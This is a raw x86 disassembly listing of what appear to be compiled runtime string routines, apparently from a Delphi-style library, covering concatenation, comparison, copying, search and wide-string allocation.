  403ce2:	74 03                	je     0x403ce7
  403ce4:	8b 40 fc             	mov    -0x4(%eax),%eax
  403ce7:	c3                   	ret
  403ce8:	85 d2                	test   %edx,%edx
  403cea:	74 3f                	je     0x403d2b
  403cec:	8b 08                	mov    (%eax),%ecx
  403cee:	85 c9                	test   %ecx,%ecx
  403cf0:	0f 84 a2 fd ff ff    	je     0x403a98
  403cf6:	53                   	push   %ebx
  403cf7:	56                   	push   %esi
  403cf8:	57                   	push   %edi
  403cf9:	89 c3                	mov    %eax,%ebx
  403cfb:	89 d6                	mov    %edx,%esi
  403cfd:	8b 79 fc             	mov    -0x4(%ecx),%edi
  403d00:	8b 56 fc             	mov    -0x4(%esi),%edx
  403d03:	01 fa                	add    %edi,%edx
  403d05:	39 ce                	cmp    %ecx,%esi
  403d07:	74 17                	je     0x403d20
  403d09:	e8 02 03 00 00       	call   0x404010
  403d0e:	89 f0                	mov    %esi,%eax
  403d10:	8b 4e fc             	mov    -0x4(%esi),%ecx
  403d13:	8b 13                	mov    (%ebx),%edx
  403d15:	01 fa                	add    %edi,%edx
  403d17:	e8 94 ea ff ff       	call   0x4027b0
  403d1c:	5f                   	pop    %edi
  403d1d:	5e                   	pop    %esi
  403d1e:	5b                   	pop    %ebx
  403d1f:	c3                   	ret
  403d20:	e8 eb 02 00 00       	call   0x404010
  403d25:	8b 03                	mov    (%ebx),%eax
  403d27:	89 f9                	mov    %edi,%ecx
  403d29:	eb e8                	jmp    0x403d13
  403d2b:	c3                   	ret
  403d2c:	85 d2                	test   %edx,%edx
  403d2e:	74 61                	je     0x403d91
  403d30:	85 c9                	test   %ecx,%ecx
  403d32:	0f 84 60 fd ff ff    	je     0x403a98
  403d38:	3b 10                	cmp    (%eax),%edx
  403d3a:	74 5c                	je     0x403d98
  403d3c:	3b 08                	cmp    (%eax),%ecx
  403d3e:	74 0e                	je     0x403d4e
  403d40:	50                   	push   %eax
  403d41:	51                   	push   %ecx
  403d42:	e8 51 fd ff ff       	call   0x403a98
  403d47:	5a                   	pop    %edx
  403d48:	58                   	pop    %eax
  403d49:	e9 9a ff ff ff       	jmp    0x403ce8
  403d4e:	53                   	push   %ebx
  403d4f:	56                   	push   %esi
  403d50:	57                   	push   %edi
  403d51:	89 d3                	mov    %edx,%ebx
  403d53:	89 ce                	mov    %ecx,%esi
  403d55:	50                   	push   %eax
  403d56:	8b 43 fc             	mov    -0x4(%ebx),%eax
  403d59:	03 46 fc             	add    -0x4(%esi),%eax
  403d5c:	e8 a7 fd ff ff       	call   0x403b08
  403d61:	89 c7                	mov    %eax,%edi
  403d63:	89 c2                	mov    %eax,%edx
  403d65:	89 d8                	mov    %ebx,%eax
  403d67:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  403d6a:	e8 41 ea ff ff       	call   0x4027b0
  403d6f:	89 fa                	mov    %edi,%edx
  403d71:	89 f0                	mov    %esi,%eax
  403d73:	8b 4e fc             	mov    -0x4(%esi),%ecx
  403d76:	03 53 fc             	add    -0x4(%ebx),%edx
  403d79:	e8 32 ea ff ff       	call   0x4027b0
  403d7e:	58                   	pop    %eax
  403d7f:	89 fa                	mov    %edi,%edx
  403d81:	85 ff                	test   %edi,%edi
  403d83:	74 03                	je     0x403d88
  403d85:	ff 4f f8             	decl   -0x8(%edi)
  403d88:	e8 0b fd ff ff       	call   0x403a98
  403d8d:	5f                   	pop    %edi
  403d8e:	5e                   	pop    %esi
  403d8f:	5b                   	pop    %ebx
  403d90:	c3                   	ret
  403d91:	89 ca                	mov    %ecx,%edx
  403d93:	e9 00 fd ff ff       	jmp    0x403a98
  403d98:	89 ca                	mov    %ecx,%edx
  403d9a:	e9 49 ff ff ff       	jmp    0x403ce8
  403d9f:	c3                   	ret
  403da0:	53                   	push   %ebx
  403da1:	56                   	push   %esi
  403da2:	57                   	push   %edi
  403da3:	52                   	push   %edx
  403da4:	50                   	push   %eax
  403da5:	89 d3                	mov    %edx,%ebx
  403da7:	31 ff                	xor    %edi,%edi
  403da9:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  403dad:	85 c9                	test   %ecx,%ecx
  403daf:	74 0c                	je     0x403dbd
  403db1:	39 08                	cmp    %ecx,(%eax)
  403db3:	75 08                	jne    0x403dbd
  403db5:	89 cf                	mov    %ecx,%edi
  403db7:	8b 41 fc             	mov    -0x4(%ecx),%eax
  403dba:	4a                   	dec    %edx
  403dbb:	eb 02                	jmp    0x403dbf
  403dbd:	31 c0                	xor    %eax,%eax
  403dbf:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  403dc3:	85 c9                	test   %ecx,%ecx
  403dc5:	74 09                	je     0x403dd0
  403dc7:	03 41 fc             	add    -0x4(%ecx),%eax
  403dca:	39 cf                	cmp    %ecx,%edi
  403dcc:	75 02                	jne    0x403dd0
  403dce:	31 ff                	xor    %edi,%edi
  403dd0:	4a                   	dec    %edx
  403dd1:	75 ec                	jne    0x403dbf
  403dd3:	85 ff                	test   %edi,%edi
  403dd5:	74 17                	je     0x403dee
  403dd7:	89 c2                	mov    %eax,%edx
  403dd9:	8b 04 24             	mov    (%esp),%eax
  403ddc:	8b 77 fc             	mov    -0x4(%edi),%esi
  403ddf:	e8 2c 02 00 00       	call   0x404010
  403de4:	8b 3c 24             	mov    (%esp),%edi
  403de7:	ff 37                	push   (%edi)
  403de9:	03 37                	add    (%edi),%esi
  403deb:	4b                   	dec    %ebx
  403dec:	eb 08                	jmp    0x403df6
  403dee:	e8 15 fd ff ff       	call   0x403b08
  403df3:	50                   	push   %eax
  403df4:	89 c6                	mov    %eax,%esi
  403df6:	8b 44 9c 18          	mov    0x18(%esp,%ebx,4),%eax
  403dfa:	89 f2                	mov    %esi,%edx
  403dfc:	85 c0                	test   %eax,%eax
  403dfe:	74 0a                	je     0x403e0a
  403e00:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403e03:	01 ce                	add    %ecx,%esi
  403e05:	e8 a6 e9 ff ff       	call   0x4027b0
  403e0a:	4b                   	dec    %ebx
  403e0b:	75 e9                	jne    0x403df6
  403e0d:	5a                   	pop    %edx
  403e0e:	58                   	pop    %eax
  403e0f:	85 ff                	test   %edi,%edi
  403e11:	75 0c                	jne    0x403e1f
  403e13:	85 d2                	test   %edx,%edx
  403e15:	74 03                	je     0x403e1a
  403e17:	ff 4a f8             	decl   -0x8(%edx)
  403e1a:	e8 79 fc ff ff       	call   0x403a98
  403e1f:	5a                   	pop    %edx
  403e20:	5f                   	pop    %edi
  403e21:	5e                   	pop    %esi
  403e22:	5b                   	pop    %ebx
  403e23:	58                   	pop    %eax
  403e24:	8d 24 94             	lea    (%esp,%edx,4),%esp
  403e27:	ff e0                	jmp    *%eax
  403e29:	c3                   	ret
  403e2a:	8b c0                	mov    %eax,%eax
  403e2c:	53                   	push   %ebx
  403e2d:	56                   	push   %esi
  403e2e:	57                   	push   %edi
  403e2f:	89 c6                	mov    %eax,%esi
  403e31:	89 d7                	mov    %edx,%edi
  403e33:	39 d0                	cmp    %edx,%eax
  403e35:	0f 84 8f 00 00 00    	je     0x403eca
  403e3b:	85 f6                	test   %esi,%esi
  403e3d:	74 68                	je     0x403ea7
  403e3f:	85 ff                	test   %edi,%edi
  403e41:	74 6b                	je     0x403eae
  403e43:	8b 46 fc             	mov    -0x4(%esi),%eax
  403e46:	8b 57 fc             	mov    -0x4(%edi),%edx
  403e49:	29 d0                	sub    %edx,%eax
  403e4b:	77 02                	ja     0x403e4f
  403e4d:	01 c2                	add    %eax,%edx
  403e4f:	52                   	push   %edx
  403e50:	c1 ea 02             	shr    $0x2,%edx
  403e53:	74 26                	je     0x403e7b
  403e55:	8b 0e                	mov    (%esi),%ecx
  403e57:	8b 1f                	mov    (%edi),%ebx
  403e59:	39 d9                	cmp    %ebx,%ecx
  403e5b:	75 58                	jne    0x403eb5
  403e5d:	4a                   	dec    %edx
  403e5e:	74 15                	je     0x403e75
  403e60:	8b 4e 04             	mov    0x4(%esi),%ecx
  403e63:	8b 5f 04             	mov    0x4(%edi),%ebx
  403e66:	39 d9                	cmp    %ebx,%ecx
  403e68:	75 4b                	jne    0x403eb5
  403e6a:	83 c6 08             	add    $0x8,%esi
  403e6d:	83 c7 08             	add    $0x8,%edi
  403e70:	4a                   	dec    %edx
  403e71:	75 e2                	jne    0x403e55
  403e73:	eb 06                	jmp    0x403e7b
  403e75:	83 c6 04             	add    $0x4,%esi
  403e78:	83 c7 04             	add    $0x4,%edi
  403e7b:	5a                   	pop    %edx
  403e7c:	83 e2 03             	and    $0x3,%edx
  403e7f:	74 22                	je     0x403ea3
  403e81:	8b 0e                	mov    (%esi),%ecx
  403e83:	8b 1f                	mov    (%edi),%ebx
  403e85:	38 d9                	cmp    %bl,%cl
  403e87:	75 41                	jne    0x403eca
  403e89:	4a                   	dec    %edx
  403e8a:	74 17                	je     0x403ea3
  403e8c:	38 fd                	cmp    %bh,%ch
  403e8e:	75 3a                	jne    0x403eca
  403e90:	4a                   	dec    %edx
  403e91:	74 10                	je     0x403ea3
  403e93:	81 e3 00 00 ff 00    	and    $0xff0000,%ebx
  403e99:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  403e9f:	39 d9                	cmp    %ebx,%ecx
  403ea1:	75 27                	jne    0x403eca
  403ea3:	01 c0                	add    %eax,%eax
  403ea5:	eb 23                	jmp    0x403eca
  403ea7:	8b 57 fc             	mov    -0x4(%edi),%edx
  403eaa:	29 d0                	sub    %edx,%eax
  403eac:	eb 1c                	jmp    0x403eca
  403eae:	8b 46 fc             	mov    -0x4(%esi),%eax
  403eb1:	29 d0                	sub    %edx,%eax
  403eb3:	eb 15                	jmp    0x403eca
  403eb5:	5a                   	pop    %edx
  403eb6:	38 d9                	cmp    %bl,%cl
  403eb8:	75 10                	jne    0x403eca
  403eba:	38 fd                	cmp    %bh,%ch
  403ebc:	75 0c                	jne    0x403eca
  403ebe:	c1 e9 10             	shr    $0x10,%ecx
  403ec1:	c1 eb 10             	shr    $0x10,%ebx
  403ec4:	38 d9                	cmp    %bl,%cl
  403ec6:	75 02                	jne    0x403eca
  403ec8:	38 fd                	cmp    %bh,%ch
  403eca:	5f                   	pop    %edi
  403ecb:	5e                   	pop    %esi
  403ecc:	5b                   	pop    %ebx
  403ecd:	c3                   	ret
  403ece:	8b c0                	mov    %eax,%eax
  403ed0:	85 c0                	test   %eax,%eax
  403ed2:	74 0a                	je     0x403ede
  403ed4:	8b 50 f8             	mov    -0x8(%eax),%edx
  403ed7:	42                   	inc    %edx
  403ed8:	7e 04                	jle    0x403ede
  403eda:	f0 ff 40 f8          	lock incl -0x8(%eax)
  403ede:	c3                   	ret
  403edf:	90                   	nop
  403ee0:	85 c0                	test   %eax,%eax
  403ee2:	74 02                	je     0x403ee6
  403ee4:	c3                   	ret
  403ee5:	00 b8 e5 3e 40 00    	add    %bh,0x403ee5(%eax)
  403eeb:	c3                   	ret
  403eec:	8b 10                	mov    (%eax),%edx
  403eee:	85 d2                	test   %edx,%edx
  403ef0:	74 38                	je     0x403f2a
  403ef2:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403ef5:	49                   	dec    %ecx
  403ef6:	74 32                	je     0x403f2a
  403ef8:	53                   	push   %ebx
  403ef9:	89 c3                	mov    %eax,%ebx
  403efb:	8b 42 fc             	mov    -0x4(%edx),%eax
  403efe:	e8 05 fc ff ff       	call   0x403b08
  403f03:	89 c2                	mov    %eax,%edx
  403f05:	8b 03                	mov    (%ebx),%eax
  403f07:	89 13                	mov    %edx,(%ebx)
  403f09:	50                   	push   %eax
  403f0a:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403f0d:	e8 9e e8 ff ff       	call   0x4027b0
  403f12:	58                   	pop    %eax
  403f13:	8b 48 f8             	mov    -0x8(%eax),%ecx
  403f16:	49                   	dec    %ecx
  403f17:	7c 0e                	jl     0x403f27
  403f19:	f0 ff 48 f8          	lock decl -0x8(%eax)
  403f1d:	75 08                	jne    0x403f27
  403f1f:	8d 40 f8             	lea    -0x8(%eax),%eax
  403f22:	e8 21 e7 ff ff       	call   0x402648
  403f27:	8b 13                	mov    (%ebx),%edx
  403f29:	5b                   	pop    %ebx
  403f2a:	89 d0                	mov    %edx,%eax
  403f2c:	c3                   	ret
  403f2d:	8d 40 00             	lea    0x0(%eax),%eax
  403f30:	e9 b7 ff ff ff       	jmp    0x403eec
  403f35:	c3                   	ret
  403f36:	8b c0                	mov    %eax,%eax
  403f38:	e9 af ff ff ff       	jmp    0x403eec
  403f3d:	c3                   	ret
  403f3e:	8b c0                	mov    %eax,%eax
  403f40:	53                   	push   %ebx
  403f41:	85 c0                	test   %eax,%eax
  403f43:	74 2d                	je     0x403f72
  403f45:	8b 58 fc             	mov    -0x4(%eax),%ebx
  403f48:	85 db                	test   %ebx,%ebx
  403f4a:	74 26                	je     0x403f72
  403f4c:	4a                   	dec    %edx
  403f4d:	7c 1b                	jl     0x403f6a
  403f4f:	39 da                	cmp    %ebx,%edx
  403f51:	7d 1f                	jge    0x403f72
  403f53:	29 d3                	sub    %edx,%ebx
  403f55:	85 c9                	test   %ecx,%ecx
  403f57:	7c 19                	jl     0x403f72
  403f59:	39 d9                	cmp    %ebx,%ecx
  403f5b:	7f 11                	jg     0x403f6e
  403f5d:	01 c2                	add    %eax,%edx
  403f5f:	8b 44 24 08          	mov    0x8(%esp),%eax
  403f63:	e8 cc fb ff ff       	call   0x403b34
  403f68:	eb 11                	jmp    0x403f7b
  403f6a:	31 d2                	xor    %edx,%edx
  403f6c:	eb e5                	jmp    0x403f53
  403f6e:	89 d9                	mov    %ebx,%ecx
  403f70:	eb eb                	jmp    0x403f5d
  403f72:	8b 44 24 08          	mov    0x8(%esp),%eax
  403f76:	e8 c9 fa ff ff       	call   0x403a44
  403f7b:	5b                   	pop    %ebx
  403f7c:	c2 04 00             	ret    $0x4
  403f7f:	c3                   	ret
  403f80:	53                   	push   %ebx
  403f81:	56                   	push   %esi
  403f82:	57                   	push   %edi
  403f83:	89 c3                	mov    %eax,%ebx
  403f85:	89 d6                	mov    %edx,%esi
  403f87:	89 cf                	mov    %ecx,%edi
  403f89:	e8 a2 ff ff ff       	call   0x403f30
  403f8e:	8b 13                	mov    (%ebx),%edx
  403f90:	85 d2                	test   %edx,%edx
  403f92:	74 30                	je     0x403fc4
  403f94:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403f97:	4e                   	dec    %esi
  403f98:	7c 2a                	jl     0x403fc4
  403f9a:	39 ce                	cmp    %ecx,%esi
  403f9c:	7d 26                	jge    0x403fc4
  403f9e:	85 ff                	test   %edi,%edi
  403fa0:	7e 22                	jle    0x403fc4
  403fa2:	29 f1                	sub    %esi,%ecx
  403fa4:	39 cf                	cmp    %ecx,%edi
  403fa6:	7e 02                	jle    0x403faa
  403fa8:	89 cf                	mov    %ecx,%edi
  403faa:	29 f9                	sub    %edi,%ecx
  403fac:	01 f2                	add    %esi,%edx
  403fae:	8d 04 17             	lea    (%edi,%edx,1),%eax
  403fb1:	e8 fa e7 ff ff       	call   0x4027b0
  403fb6:	8b 13                	mov    (%ebx),%edx
  403fb8:	89 d8                	mov    %ebx,%eax
  403fba:	8b 52 fc             	mov    -0x4(%edx),%edx
  403fbd:	29 fa                	sub    %edi,%edx
  403fbf:	e8 4c 00 00 00       	call   0x404010
  403fc4:	5f                   	pop    %edi
  403fc5:	5e                   	pop    %esi
  403fc6:	5b                   	pop    %ebx
  403fc7:	c3                   	ret
  403fc8:	85 c0                	test   %eax,%eax
  403fca:	74 40                	je     0x40400c
  403fcc:	85 d2                	test   %edx,%edx
  403fce:	74 31                	je     0x404001
  403fd0:	53                   	push   %ebx
  403fd1:	56                   	push   %esi
  403fd2:	57                   	push   %edi
  403fd3:	89 c6                	mov    %eax,%esi
  403fd5:	89 d7                	mov    %edx,%edi
  403fd7:	8b 4f fc             	mov    -0x4(%edi),%ecx
  403fda:	57                   	push   %edi
  403fdb:	8b 56 fc             	mov    -0x4(%esi),%edx
  403fde:	4a                   	dec    %edx
  403fdf:	78 1b                	js     0x403ffc
  403fe1:	8a 06                	mov    (%esi),%al
  403fe3:	46                   	inc    %esi
  403fe4:	29 d1                	sub    %edx,%ecx
  403fe6:	7e 14                	jle    0x403ffc
  403fe8:	f2 ae                	repnz scas %es:(%edi),%al
  403fea:	75 10                	jne    0x403ffc
  403fec:	89 cb                	mov    %ecx,%ebx
  403fee:	56                   	push   %esi
  403fef:	57                   	push   %edi
  403ff0:	89 d1                	mov    %edx,%ecx
  403ff2:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  403ff4:	5f                   	pop    %edi
  403ff5:	5e                   	pop    %esi
  403ff6:	74 0c                	je     0x404004
  403ff8:	89 d9                	mov    %ebx,%ecx
  403ffa:	eb ec                	jmp    0x403fe8
  403ffc:	5a                   	pop    %edx
  403ffd:	31 c0                	xor    %eax,%eax
  403fff:	eb 08                	jmp    0x404009
  404001:	31 c0                	xor    %eax,%eax
  404003:	c3                   	ret
  404004:	5a                   	pop    %edx
  404005:	89 f8                	mov    %edi,%eax
  404007:	29 d0                	sub    %edx,%eax
  404009:	5f                   	pop    %edi
  40400a:	5e                   	pop    %esi
  40400b:	5b                   	pop    %ebx
  40400c:	c3                   	ret
  40400d:	8d 40 00             	lea    0x0(%eax),%eax
  404010:	53                   	push   %ebx
  404011:	56                   	push   %esi
  404012:	57                   	push   %edi
  404013:	89 c3                	mov    %eax,%ebx
  404015:	89 d6                	mov    %edx,%esi
  404017:	31 ff                	xor    %edi,%edi
  404019:	85 d2                	test   %edx,%edx
  40401b:	7e 48                	jle    0x404065
  40401d:	8b 03                	mov    (%ebx),%eax
  40401f:	85 c0                	test   %eax,%eax
  404021:	74 23                	je     0x404046
  404023:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  404027:	75 1d                	jne    0x404046
  404029:	83 e8 08             	sub    $0x8,%eax
  40402c:	83 c2 09             	add    $0x9,%edx
  40402f:	50                   	push   %eax
  404030:	89 e0                	mov    %esp,%eax
  404032:	e8 31 e6 ff ff       	call   0x402668
  404037:	58                   	pop    %eax
  404038:	83 c0 08             	add    $0x8,%eax
  40403b:	89 03                	mov    %eax,(%ebx)
  40403d:	89 70 fc             	mov    %esi,-0x4(%eax)
  404040:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  404044:	eb 28                	jmp    0x40406e
  404046:	89 d0                	mov    %edx,%eax
  404048:	e8 bb fa ff ff       	call   0x403b08
  40404d:	89 c7                	mov    %eax,%edi
  40404f:	8b 03                	mov    (%ebx),%eax
  404051:	85 c0                	test   %eax,%eax
  404053:	74 10                	je     0x404065
  404055:	89 fa                	mov    %edi,%edx
  404057:	8b 48 fc             	mov    -0x4(%eax),%ecx
  40405a:	39 f1                	cmp    %esi,%ecx
  40405c:	7c 02                	jl     0x404060
  40405e:	89 f1                	mov    %esi,%ecx
  404060:	e8 4b e7 ff ff       	call   0x4027b0
  404065:	89 d8                	mov    %ebx,%eax
  404067:	e8 d8 f9 ff ff       	call   0x403a44
  40406c:	89 3b                	mov    %edi,(%ebx)
  40406e:	5f                   	pop    %edi
  40406f:	5e                   	pop    %esi
  404070:	5b                   	pop    %ebx
  404071:	c3                   	ret
  404072:	8b c0                	mov    %eax,%eax
  404074:	b0 01                	mov    $0x1,%al
  404076:	e9 95 e6 ff ff       	jmp    0x402710
  40407b:	c3                   	ret
  40407c:	85 c0                	test   %eax,%eax
  40407e:	74 10                	je     0x404090
  404080:	50                   	push   %eax
  404081:	6a 00                	push   $0x0
  404083:	e8 b8 d1 ff ff       	call   0x401240
  404088:	85 c0                	test   %eax,%eax
  40408a:	0f 84 e4 ff ff ff    	je     0x404074
  404090:	c3                   	ret
  404091:	8d 40 00             	lea    0x0(%eax),%eax
  404094:	87 10                	xchg   %edx,(%eax)
  404096:	85 d2                	test   %edx,%edx
  404098:	74 06                	je     0x4040a0
  40409a:	52                   	push   %edx
  40409b:	e8 b0 d1 ff ff       	call   0x401250
  4040a0:	c3                   	ret
  4040a1:	8d 40 00             	lea    0x0(%eax),%eax
  4040a4:	8b 10                	mov    (%eax),%edx
  4040a6:	85 d2                	test   %edx,%edx
  4040a8:	74 0e                	je     0x4040b8
  4040aa:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4040b0:	50                   	push   %eax
  4040b1:	52                   	push   %edx
  4040b2:	e8 99 d1 ff ff       	call   0x401250
  4040b7:	58                   	pop    %eax
  4040b8:	c3                   	ret
  4040b9:	8d 40 00             	lea    0x0(%eax),%eax
  4040bc:	53                   	push   %ebx
  4040bd:	56                   	push   %esi
  4040be:	89 c3                	mov    %eax,%ebx
  4040c0:	89 d6                	mov    %edx,%esi
  4040c2:	8b 03                	mov    (%ebx),%eax
  4040c4:	85 c0                	test   %eax,%eax
  4040c6:	74 0c                	je     0x4040d4
  4040c8:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  4040ce:	50                   	push   %eax
  4040cf:	e8 7c d1 ff ff       	call   0x401250
  4040d4:	83 c3 04             	add    $0x4,%ebx
  4040d7:	4e                   	dec    %esi
  4040d8:	75 e8                	jne    0x4040c2
  4040da:	5e                   	pop    %esi
  4040db:	5b                   	pop    %ebx
  4040dc:	c3                   	ret
  4040dd:	8d 40 00             	lea    0x0(%eax),%eax
  4040e0:	85 d2                	test   %edx,%edx
  4040e2:	0f 84 bc ff ff ff    	je     0x4040a4
  4040e8:	8b 4a fc             	mov    -0x4(%edx),%ecx
  4040eb:	d1 e9                	shr    $1,%ecx
  4040ed:	0f 84 b1 ff ff ff    	je     0x4040a4
  4040f3:	51                   	push   %ecx
  4040f4:	52                   	push   %edx
  4040f5:	50                   	push   %eax
  4040f6:	e8 4d d1 ff ff       	call   0x401248
  4040fb:	85 c0                	test   %eax,%eax
  4040fd:	0f 84 71 ff ff ff    	je     0x404074
  404103:	c3                   	ret
  404104:	53                   	push   %ebx
  404105:	56                   	push   %esi
  404106:	57                   	push   %edi
  404107:	55                   	push   %ebp
  404108:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  40410e:	50                   	push   %eax
  40410f:	83 c4 fc             	add    $0xfffffffc,%esp
  404112:	8b f1                	mov    %ecx,%esi
  404114:	89 14 24             	mov    %edx,(%esp)
  404117:	8b f8                	mov    %eax,%edi
  404119:	85 f6                	test   %esi,%esi
  40411b:	7f 09                	jg     0x404126
  40411d:	8b c7                	mov    %edi,%eax
  40411f:	e8 80 ff ff ff       	call   0x4040a4
  404124:	eb 5d                	jmp    0x404183
  404126:	8d 6e 01             	lea    0x1(%esi),%ebp
  404129:	81 fd ff 07 00 00    	cmp    $0x7ff,%ebp
  40412f:	7d 28                	jge    0x404159
  404131:	56                   	push   %esi
  404132:	8d 44 24 08          	lea    0x8(%esp),%eax
  404136:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40413a:	ba ff 07 00 00       	mov    $0x7ff,%edx
  40413f:	e8 40 fa ff ff       	call   0x403b84
  404144:	8b d8                	mov    %eax,%ebx
  404146:	85 db                	test   %ebx,%ebx
  404148:	7e 0f                	jle    0x404159
  40414a:	8d 54 24 04          	lea    0x4(%esp),%edx
  40414e:	8b c7                	mov    %edi,%eax
  404150:	8b cb                	mov    %ebx,%ecx
  404152:	e8 39 00 00 00       	call   0x404190
  404157:	eb 2a                	jmp    0x404183
  404159:	8b dd                	mov    %ebp,%ebx
  40415b:	8b c7                	mov    %edi,%eax
  40415d:	8b d3                	mov    %ebx,%edx
  40415f:	e8 88 01 00 00       	call   0x4042ec
  404164:	56                   	push   %esi
  404165:	8b 07                	mov    (%edi),%eax
  404167:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40416b:	8b d3                	mov    %ebx,%edx
  40416d:	e8 12 fa ff ff       	call   0x403b84
  404172:	8b d8                	mov    %eax,%ebx
  404174:	85 db                	test   %ebx,%ebx
  404176:	7d 02                	jge    0x40417a
  404178:	33 db                	xor    %ebx,%ebx
  40417a:	8b c7                	mov    %edi,%eax
  40417c:	8b d3                	mov    %ebx,%edx
  40417e:	e8 69 01 00 00       	call   0x4042ec
  404183:	81 c4 04 10 00 00    	add    $0x1004,%esp
  404189:	5d                   	pop    %ebp
  40418a:	5f                   	pop    %edi
  40418b:	5e                   	pop    %esi
  40418c:	5b                   	pop    %ebx
  40418d:	c3                   	ret
  40418e:	8b c0                	mov    %eax,%eax
  404190:	85 c9                	test   %ecx,%ecx
  404192:	0f 84 0c ff ff ff    	je     0x4040a4
  404198:	50                   	push   %eax
  404199:	51                   	push   %ecx
  40419a:	52                   	push   %edx
  40419b:	e8 a0 d0 ff ff       	call   0x401240
  4041a0:	85 c0                	test   %eax,%eax
  4041a2:	0f 84 cc fe ff ff    	je     0x404074
  4041a8:	5a                   	pop    %edx
  4041a9:	ff 32                	push   (%edx)
  4041ab:	89 02                	mov    %eax,(%edx)
  4041ad:	e8 9e d0 ff ff       	call   0x401250
  4041b2:	c3                   	ret
  4041b3:	90                   	nop
  4041b4:	31 c9                	xor    %ecx,%ecx
  4041b6:	85 d2                	test   %edx,%edx
  4041b8:	74 2d                	je     0x4041e7
  4041ba:	52                   	push   %edx
  4041bb:	66 3b 0a             	cmp    (%edx),%cx
  4041be:	74 20                	je     0x4041e0
  4041c0:	66 3b 4a 02          	cmp    0x2(%edx),%cx
  4041c4:	74 17                	je     0x4041dd
  4041c6:	66 3b 4a 04          	cmp    0x4(%edx),%cx
  4041ca:	74 0e                	je     0x4041da
  4041cc:	66 3b 4a 06          	cmp    0x6(%edx),%cx
  4041d0:	74 05                	je     0x4041d7
  4041d2:	83 c2 08             	add    $0x8,%edx
  4041d5:	eb e4                	jmp    0x4041bb
  4041d7:	83 c2 02             	add    $0x2,%edx
  4041da:	83 c2 02             	add    $0x2,%edx
  4041dd:	83 c2 02             	add    $0x2,%edx
  4041e0:	89 d1                	mov    %edx,%ecx
  4041e2:	5a                   	pop    %edx
  4041e3:	29 d1                	sub    %edx,%ecx
  4041e5:	d1 e9                	shr    $1,%ecx
  4041e7:	e9 a4 ff ff ff       	jmp    0x404190
  4041ec:	c3                   	ret
  4041ed:	8d 40 00             	lea    0x0(%eax),%eax
  4041f0:	31 c9                	xor    %ecx,%ecx
  4041f2:	85 d2                	test   %edx,%edx
  4041f4:	74 03                	je     0x4041f9
  4041f6:	8b 4a fc             	mov    -0x4(%edx),%ecx
  4041f9:	e9 06 ff ff ff       	jmp    0x404104
  4041fe:	c3                   	ret
  4041ff:	90                   	nop
  404200:	85 c0                	test   %eax,%eax
  404202:	74 04                	je     0x404208
  404204:	c3                   	ret
  404205:	90                   	nop
  404206:	00 00                	add    %al,(%eax)
  404208:	b8 06 42 40 00       	mov    $0x404206,%eax
  40420d:	c3                   	ret
  40420e:	8b c0                	mov    %eax,%eax
  404210:	85 c0                	test   %eax,%eax
  404212:	74 05                	je     0x404219
  404214:	8b 40 fc             	mov    -0x4(%eax),%eax
  404217:	d1 e8                	shr    $1,%eax
  404219:	c3                   	ret
  40421a:	8b c0                	mov    %eax,%eax
  40421c:	53                   	push   %ebx
  40421d:	56                   	push   %esi
  40421e:	57                   	push   %edi
  40421f:	89 c6                	mov    %eax,%esi
  404221:	89 d7                	mov    %edx,%edi
  404223:	39 d0                	cmp    %edx,%eax
  404225:	74 72                	je     0x404299
  404227:	85 f6                	test   %esi,%esi
  404229:	74 51                	je     0x40427c
  40422b:	85 ff                	test   %edi,%edi
  40422d:	74 54                	je     0x404283
  40422f:	8b 46 fc             	mov    -0x4(%esi),%eax
  404232:	8b 57 fc             	mov    -0x4(%edi),%edx
  404235:	29 d0                	sub    %edx,%eax
  404237:	77 02                	ja     0x40423b
  404239:	01 c2                	add    %eax,%edx
  40423b:	52                   	push   %edx
  40423c:	c1 ea 02             	shr    $0x2,%edx
  40423f:	74 26                	je     0x404267
  404241:	8b 0e                	mov    (%esi),%ecx
  404243:	8b 1f                	mov    (%edi),%ebx
  404245:	39 d9                	cmp    %ebx,%ecx
  404247:	75 41                	jne    0x40428a
  404249:	4a                   	dec    %edx
  40424a:	74 15                	je     0x404261
  40424c:	8b 4e 04             	mov    0x4(%esi),%ecx
  40424f:	8b 5f 04             	mov    0x4(%edi),%ebx
  404252:	39 d9                	cmp    %ebx,%ecx
  404254:	75 34                	jne    0x40428a
  404256:	83 c6 08             	add    $0x8,%esi
  404259:	83 c7 08             	add    $0x8,%edi
  40425c:	4a                   	dec    %edx
  40425d:	75 e2                	jne    0x404241
  40425f:	eb 06                	jmp    0x404267
  404261:	83 c6 04             	add    $0x4,%esi
  404264:	83 c7 04             	add    $0x4,%edi
  404267:	5a                   	pop    %edx
  404268:	83 e2 02             	and    $0x2,%edx
  40426b:	74 0b                	je     0x404278
  40426d:	66 8b 0e             	mov    (%esi),%cx
  404270:	66 8b 1f             	mov    (%edi),%bx
  404273:	66 39 d9             	cmp    %bx,%cx
  404276:	75 21                	jne    0x404299
  404278:	01 c0                	add    %eax,%eax
  40427a:	eb 1d                	jmp    0x404299
  40427c:	8b 57 fc             	mov    -0x4(%edi),%edx
  40427f:	29 d0                	sub    %edx,%eax
  404281:	eb 16                	jmp    0x404299
  404283:	8b 46 fc             	mov    -0x4(%esi),%eax
  404286:	29 d0                	sub    %edx,%eax
  404288:	eb 0f                	jmp    0x404299
  40428a:	5a                   	pop    %edx
  40428b:	66 39 d9             	cmp    %bx,%cx
  40428e:	75 09                	jne    0x404299
  404290:	c1 e9 10             	shr    $0x10,%ecx
  404293:	c1 eb 10             	shr    $0x10,%ebx
  404296:	66 39 d9             	cmp    %bx,%cx
  404299:	5f                   	pop    %edi
  40429a:	5e                   	pop    %esi
  40429b:	5b                   	pop    %ebx
  40429c:	c3                   	ret
  40429d:	8d 40 00             	lea    0x0(%eax),%eax
